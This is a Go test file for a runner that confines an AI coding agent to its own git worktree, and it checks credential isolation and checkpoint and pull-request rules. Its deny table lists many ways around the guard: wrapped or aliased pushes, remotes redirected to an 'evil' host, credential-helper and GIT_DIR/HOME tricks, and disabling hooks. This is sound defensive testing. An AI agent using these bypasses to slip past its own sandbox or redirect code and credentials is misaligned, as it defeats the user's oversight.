package runner_test

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/sbraznikov/istari/internal/runner"
)

func TestGitInTheOwnWorktreeIsFreeAndWhatReachesBeyondItIsDenied(t *testing.T) {
	const wt = "/data/workspaces/web/web/7"
	for _, command := range []string{
		"git rebase -i HEAD~3",
		"git commit --amend --no-edit",
		"git reset --hard HEAD~1",
		"git status && git log --oneline -5",
		"git -C " + wt + " status",
		"git -C src diff",
		"git remote -v",
		"git remote get-url origin",
		"git worktree list",
		"go test ./... | tee out.txt",
		"echo 'git push is how we used to do it'",
		"cd src && git add . && git commit -m wip",
		`cd "$(git rev-parse --show-toplevel)" && git status`,
		`git -C "$PWD" status`,
		"git config --get remote.origin.url",
		"git config --get-regexp credential",
		"git remote prune origin",
		"timeout 60 go test ./...",
		"GIT_TRACE=1 git status",
	} {
		if err := runner.GitGuard(command, wt, wt); err != nil {
			t.Errorf("%q denied: %v", command, err)
		}
	}
	for command, says := range map[string]string{
		"git push":                                        "istari checkpoint",
		"git push --force origin HEAD":                    "istari checkpoint",
		"go test ./... && git push":                       "istari checkpoint",
		"git -c core.sshCommand=x push":                   "sshCommand",
		"git remote set-url origin https://evil/x.git":    "remote",
		"git remote add mine https://evil/x.git":          "remote",
		"git config remote.origin.url https://evil/x":     "remote",
		"git config --global credential.helper store":     "credential",
		"git -C /home/me/web status":                      "outside",
		"git -C ../8 commit -am x":                        "outside",
		"git --git-dir=/home/me/web/.git log":             "outside",
		"git --work-tree /tmp status":                     "outside",
		"GIT_DIR=/home/me/web/.git git log":               "outside",
		"cd /home/me/web && git commit -am x":             "outside",
		"cd .. && git status":                             "outside",
		"git worktree add ../other":                       "worktree",
		"git worktree remove .":                           "worktree",
		"timeout 60 git push":                             "istari checkpoint",
		"sudo git push":                                   "istari checkpoint",
		"nice -n 5 git push":                              "istari checkpoint",
		"echo push | xargs git":                           "",
		"bash -lc 'git push'":                             "istari checkpoint",
		"sh -ec 'git push'":                               "istari checkpoint",
		"eval 'git push'":                                 "istari checkpoint",
		"export GIT_DIR=/home/me/web/.git; git log":       "outside",
		"pushd /home/me/web && git commit -am x":          "outside",
		"git config set remote.origin.url https://evil":   "remote",
		"git -c alias.x=push x":                           "alias",
		"git config alias.p push":                         "alias",
		"git rebase -i --exec 'git push' HEAD~2":          "istari checkpoint",
		"git submodule foreach git push":                  "istari checkpoint",
		"git send-pack https://evil/x main":               "istari checkpoint",
		"GIT_CONFIG_GLOBAL=/Users/me/.gitconfig git push": "GIT_CONFIG_GLOBAL",
		"unset GH_CONFIG_DIR; gh pr merge 1":              "GH_CONFIG_DIR",
		"export HOME=/Users/me":                           "HOME",
		"env -u GIT_CONFIG_NOSYSTEM git fetch":            "GIT_CONFIG_NOSYSTEM",
		"env -i git push":                                 "env -i",
		"GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=x git log":   "GIT_CONFIG",
		"git config core.hooksPath /dev/null":             "hook",
		"sh -c 'git push'":                                "istari checkpoint",
		"env GIT_TRACE=1 git push":                        "istari checkpoint",
		"command git push":                                "istari checkpoint",
		"cd ~/web && git status":                          "outside",
		"git -C ~/web log":                                "outside",
		"git -c credential.helper=store fetch":            "credential",
		"git -c remote.origin.url=https://evil/x fetch":   "remote",
		"$(git push)":                                     "istari checkpoint",
		`echo "done: $(git push)"`:                        "istari checkpoint",
		"echo \"`git push`\"":                             "istari checkpoint",
	} {
		err := runner.GitGuard(command, wt, wt)
		if err == nil || (says != "" && !strings.Contains(err.Error(), says)) {
			t.Errorf("%q: %v, want a denial that mentions %q", command, err, says)
		}
	}
	if err := runner.GitGuard("git status", wt, "/home/me/web"); err == nil {
		t.Error("git run from outside the worktree is allowed")
	}
	for path, denied := range map[string]bool{
		wt + "/src/limits.go":             false,
		"/tmp/notes.txt":                  false,
		wt + "/.git":                      true,
		"/data/repos/acme/web.git/config": true,
		"/data/repos/acme/web.git/worktrees/7/config.worktree": true,
		"/home/me/web/.git/config":                             true,
	} {
		if err := runner.FileGuard(path); (err != nil) != denied {
			t.Errorf("writing %s: %v, denied want %v", path, err, denied)
		}
	}
}

func TestEveryRunGetsTheGitGuardForItsOwnWorktree(t *testing.T) {
	f := newRunner(t, runner.RunnerOptions{Guard: "/usr/local/bin/istari hook git-guard"})
	f.readyTask(t, 3)
	f.start(t)
	s := f.session(t)
	if s.spec.Guard != "/usr/local/bin/istari hook git-guard" || s.spec.Env["ISTARI_WORKTREE"] != s.spec.Workdir || s.spec.Workdir == "" {
		t.Fatalf("guard %q, ISTARI_WORKTREE %q, workdir %q", s.spec.Guard, s.spec.Env["ISTARI_WORKTREE"], s.spec.Workdir)
	}
	s.Stop(0)
}

func TestACheckpointOnAnotherBranchIsRefused(t *testing.T) {
	f := newCheckpoints(t)
	gitIn(t, f.ws.Dir, "checkout", "-q", "-b", "elsewhere")
	write(t, filepath.Join(f.ws.Dir, "src.txt"), "feature\n")
	if _, err := f.cp.Make(ctx, f.run, "work; more"); err == nil || !strings.Contains(err.Error(), f.ws.Branch) {
		t.Fatalf("checkpoint on branch elsewhere: %v, want a refusal naming %s", err, f.ws.Branch)
	}
	if strings.TrimSpace(gitIn(t, f.ws.Dir, "status", "--porcelain")) == "" {
		t.Fatal("the refused checkpoint committed the work")
	}
}

func TestPrOpenNeedsTheTicketBranchBasedOnTheCurrentMain(t *testing.T) {
	f, gh, prs := prFixture(t, "[checks]\ntypecheck = \"true\"\ntest = \"true\"\nfull = \"true\"\n")
	f.moveMain(t, map[string]string{"other.txt": "main moved\n"})
	if _, err := prs.Open(ctx, f.run, "Add the cache", description); err == nil || !strings.Contains(err.Error(), "main") {
		t.Fatalf("pr open behind main: %v", err)
	}
	gitIn(t, f.ws.Dir, "fetch", "-q", "origin")
	gitIn(t, f.ws.Dir, "-c", "user.name=t", "-c", "user.email=t@example.com", "merge", "-q", "--no-edit", "origin/main")
	gitIn(t, f.ws.Dir, "checkout", "-q", "-b", "elsewhere")
	if _, err := prs.Open(ctx, f.run, "Add the cache", description); err == nil || !strings.Contains(err.Error(), f.ws.Branch) {
		t.Fatalf("pr open on another branch: %v", err)
	}
	if gh.IssueCount() != 0 {
		t.Fatal("a pull request was opened")
	}
}

func TestACheckpointBehindTheMainBranchSaysSo(t *testing.T) {
	f := newCheckpoints(t)
	f.moveMain(t, map[string]string{"other.txt": "main moved\n"})
	write(t, filepath.Join(f.ws.Dir, "src.txt"), "feature\n")
	c := f.checkpoint(t, "work; more")
	if !strings.Contains(strings.Join(c.Notes, "\n"), "not based on the current main") {
		t.Fatalf("notes = %q", c.Notes)
	}
}

func TestTheAgentsGitAndGhSeeNoneOfTheUsersCredentials(t *testing.T) {
	home := t.TempDir()
	write(t, filepath.Join(home, ".gitconfig"), "[credential]\n\thelper = store\n[url \"https://evil.example/\"]\n\tinsteadOf = https://github.com/\n")
	t.Setenv("HOME", home)
	f := newRunner(t, runner.RunnerOptions{})
	f.readyTask(t, 4)
	f.start(t)
	s := f.session(t)
	defer s.Stop(0)
	env := os.Environ()
	for k, v := range s.spec.Env {
		env = append(env, k+"="+v)
	}
	cmd := exec.Command("git", "config", "--get-regexp", `^(credential|url)\.`)
	cmd.Dir, cmd.Env = s.spec.Workdir, env
	if out, _ := cmd.Output(); strings.TrimSpace(string(out)) != "" {
		t.Fatalf("the agent's git sees the user's settings:\n%s", out)
	}
	if s.spec.Env["GIT_TERMINAL_PROMPT"] != "0" {
		t.Error("git may prompt the agent for a password")
	}
	gh := s.spec.Env["GH_CONFIG_DIR"]
	if gh == "" {
		t.Fatal("gh would use the user's login")
	}
	if entries, err := os.ReadDir(gh); err != nil || len(entries) != 0 {
		t.Fatalf("GH_CONFIG_DIR %s: %v %v, want an empty directory", gh, entries, err)
	}
	cmd = exec.Command("git", "commit", "-q", "--allow-empty", "-m", "work")
	cmd.Dir, cmd.Env = s.spec.Workdir, env
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("the agent cannot commit without the user's identity: %v %s", err, out)
	}
}
